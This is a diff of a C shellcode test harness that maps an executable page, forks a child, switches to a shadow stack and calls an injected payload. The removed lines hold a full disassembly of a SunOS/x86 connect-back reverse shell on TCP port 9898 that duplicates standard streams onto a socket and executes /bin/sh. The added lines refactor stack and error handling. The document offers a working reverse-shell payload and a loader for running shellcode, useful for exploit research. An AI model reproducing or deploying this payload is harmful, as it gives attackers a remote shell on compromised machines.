@@ -1,3 +1,4 @@
+#include <errno.h>
 #include <stdio.h>
 #include <stdlib.h>
 #include <string.h>
@@ -12,110 +13,9 @@
 #include <sys/wait.h>
 #include <unistd.h>
 
+#include "compiler/compiler.h"
+#include "regs/stack.h"
 #include "regs/state.h"
-
-/*
- * SunOS (Solaris) / x86 (connectback / reverse shell) TCP:9898 149 bytes
- * shellcode
- *
- * Paulus Gandung Prakosa <gandung@lists.infradead.org>
- *
- * Tested on: SunOS solaris-vagrant 5.11 11.4.0.15.0 i86pc i386 i86pc
- *
- * Disassembly of section .text:
- *
- * 08050428 <_start>:
- * 8050428:       33 f6                   xor    %esi,%esi
- * 805042a:       33 db                   xor    %ebx,%ebx
- * 805042c:       43                      inc    %ebx
- * 805042d:       43                      inc    %ebx
- * 805042e:       33 c9                   xor    %ecx,%ecx
- * 8050430:       41                      inc    %ecx
- * 8050431:       41                      inc    %ecx
- * 8050432:       33 d2                   xor    %edx,%edx
- * 8050434:       83 c2 06                add    $0x6,%edx
- * 8050437:       56                      push   %esi
- * 8050438:       56                      push   %esi
- * 8050439:       52                      push   %edx
- * 805043a:       51                      push   %ecx
- * 805043b:       53                      push   %ebx
- * 805043c:       33 c0                   xor    %eax,%eax
- * 805043e:       b0 e6                   mov    $0xe6,%al
- * 8050440:       50                      push   %eax
- * 8050441:       cd 91                   int    $0x91
- * 8050443:       8b f8                   mov    %eax,%edi
- * 8050445:       33 d2                   xor    %edx,%edx
- * 8050447:       42                      inc    %edx
- * 8050448:       c1 e2 04                shl    $0x4,%edx
- * 805044b:       56                      push   %esi
- * 805044c:       33 c9                   xor    %ecx,%ecx
- * 805044e:       66 81 c1 26 aa          add    $0xaa26,%cx
- * 8050453:       66 51                   push   %cx
- * 8050455:       33 c9                   xor    %ecx,%ecx
- * 8050457:       41                      inc    %ecx
- * 8050458:       41                      inc    %ecx
- * 8050459:       66 51                   push   %cx
- * 805045b:       8b cc                   mov    %esp,%ecx
- * 805045d:       56                      push   %esi
- * 805045e:       52                      push   %edx
- * 805045f:       51                      push   %ecx
- * 8050460:       57                      push   %edi
- * 8050461:       33 c0                   xor    %eax,%eax
- * 8050463:       b0 eb                   mov    $0xeb,%al
- * 8050465:       50                      push   %eax
- * 8050466:       cd 91                   int    $0x91
- * 8050468:       33 d2                   xor    %edx,%edx
- * 805046a:       33 c9                   xor    %ecx,%ecx
- * 805046c:       83 c1 09                add    $0x9,%ecx
- * 805046f:       56                      push   %esi
- * 8050470:       52                      push   %edx
- * 8050471:       51                      push   %ecx
- * 8050472:       57                      push   %edi
- * 8050473:       33 c0                   xor    %eax,%eax
- * 8050475:       b0 3e                   mov    $0x3e,%al
- * 8050477:       50                      push   %eax
- * 8050478:       cd 91                   int    $0x91
- * 805047a:       33 d2                   xor    %edx,%edx
- * 805047c:       42                      inc    %edx
- * 805047d:       33 c9                   xor    %ecx,%ecx
- * 805047f:       83 c1 09                add    $0x9,%ecx
- * 8050482:       56                      push   %esi
- * 8050483:       52                      push   %edx
- * 8050484:       51                      push   %ecx
- * 8050485:       57                      push   %edi
- * 8050486:       33 c0                   xor    %eax,%eax
- * 8050488:       b0 3e                   mov    $0x3e,%al
- * 805048a:       50                      push   %eax
- * 805048b:       cd 91                   int    $0x91
- * 805048d:       33 d2                   xor    %edx,%edx
- * 805048f:       42                      inc    %edx
- * 8050490:       42                      inc    %edx
- * 8050491:       33 c9                   xor    %ecx,%ecx
- * 8050493:       83 c1 09                add    $0x9,%ecx
- * 8050496:       56                      push   %esi
- * 8050497:       52                      push   %edx
- * 8050498:       51                      push   %ecx
- * 8050499:       57                      push   %edi
- * 805049a:       33 c0                   xor    %eax,%eax
- * 805049c:       b0 3e                   mov    $0x3e,%al
- * 805049e:       50                      push   %eax
- * 805049f:       cd 91                   int    $0x91
- * 80504a1:       56                      push   %esi
- * 80504a2:       68 6e 2f 73 68          push   $0x68732f6e
- * 80504a7:       68 2f 2f 62 69          push   $0x69622f2f
- * 80504ac:       8b dc                   mov    %esp,%ebx
- * 80504ae:       56                      push   %esi
- * 80504af:       53                      push   %ebx
- * 80504b0:       8b cc                   mov    %esp,%ecx
- * 80504b2:       56                      push   %esi
- * 80504b3:       56                      push   %esi
- * 80504b4:       51                      push   %ecx
- * 80504b5:       53                      push   %ebx
- * 80504b6:       33 c0                   xor    %eax,%eax
- * 80504b8:       04 3b                   add    $0x3b,%al
- * 80504ba:       50                      push   %eax
- * 80504bb:       cd 91                   int    $0x91
- */
 
 #ifndef unused
 #define unused(x) ((void)(x))
@@ -158,17 +58,17 @@ int main(int argc, char **argv) {
   pcall = mmap(NULL, sysconf(_SC_PAGESIZE), PROT_WRITE | PROT_EXEC,
                MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
 
-  if (pcall == MAP_FAILED) {
+  if (unlikely(pcall == MAP_FAILED)) {
     perror("mmap()");
-    ret = -1;
+    ret = -errno;
     goto __fallback;
   }
 
   shadow_stack = calloc(SHADOW_STACK_SIZE, sizeof(char));
 
-  if (!shadow_stack) {
+  if (unlikely(!shadow_stack)) {
     perror("calloc()");
-    ret = -1;
+    ret = -errno;
     goto __must_unmap_payload;
   }
 
@@ -176,6 +76,7 @@ int main(int argc, char **argv) {
 
   if ((ret = uname(&uts)) < 0) {
     perror("uname()");
+    ret = -errno;
     goto __must_unmap_shadow_stack;
   }
 
@@ -192,42 +93,51 @@ int main(int argc, char **argv) {
   printf("[*] Saving register state..\n");
   save_regs(&__serialize_regs(cregs));
 
+  printf("[*] Saving thread stack..\n");
+  thread_stack = get_stack();
+
   printf("[*] Creating trivial sandbox..\n");
 
   pid = fork();
 
-  if (pid < 0) {
+  if (unlikely(pid < 0)) {
     perror("fork()");
-    ret = pid;
+    ret = -errno;
     goto __must_restore_regs;
   }
 
-  if (!pid) {
-    printf("[*] Saving thread stack..\n");
-    __asm__ __volatile__("movl %%esp, %0\n" : "=r"(thread_stack));
-
+  if (likely(!pid)) {
 #ifdef THREAD_DEBUG
     printf("[*] Debug\n");
-    printf(" [*] Thread stack: %p\n", thread_stack);
-    printf(" [*] Shadow stack: %p\n", shadow_stack);
+    printf(" [*] thread_stack: %p\n", thread_stack);
+    printf(" [*] shadow_stack: %p\n", shadow_stack);
 #endif
 
     printf("[*] Installing shadow stack..\n");
-    __asm__ __volatile__("movl %0, %%edi\n"
-                         "xchgl %%edi, %%esp\n"
-                         :
-                         : "r"((unsigned long)shadow_stack));
+    set_stack(shadow_stack);
 
-    printf("[*] Executing the shellcode and restoring stack..\n");
-    __asm__ __volatile__("call *%%eax\n"
-                         "movl %0, %%edi\n"
-                         "xchgl %%edi, %%esp\n"
-                         :
-                         : "r"((unsigned long)thread_stack), "a"(pcall));
+    if ((unsigned long)get_stack() != (unsigned long)shadow_stack) {
+      printf("[-] Failing to install shadow stack. Fallback..\n");
+      exit(1);
+    }
+
+    printf("[*] Shadow stack installed.\n");
+    printf("[*] Executing the shellcode..\n");
+    __asm__ __volatile__("calll *%%eax\n" : : "a"(pcall));
   } else {
     waitpid(-1, &wstatus, 0);
   }
 
+  printf("[*] Restoring the stack..\n");
+  set_stack(thread_stack);
+
+  if ((unsigned long)get_stack() != (unsigned long)thread_stack) {
+    printf("[-] Stack restoration failed. Fallback..\n");
+    ret = -1;
+    goto __must_restore_regs;
+  }
+
+  printf("[*] Stack restored.\n");
   printf("[*] Restoring register state..\n");
   store_regs(&__serialize_regs(cregs));
 
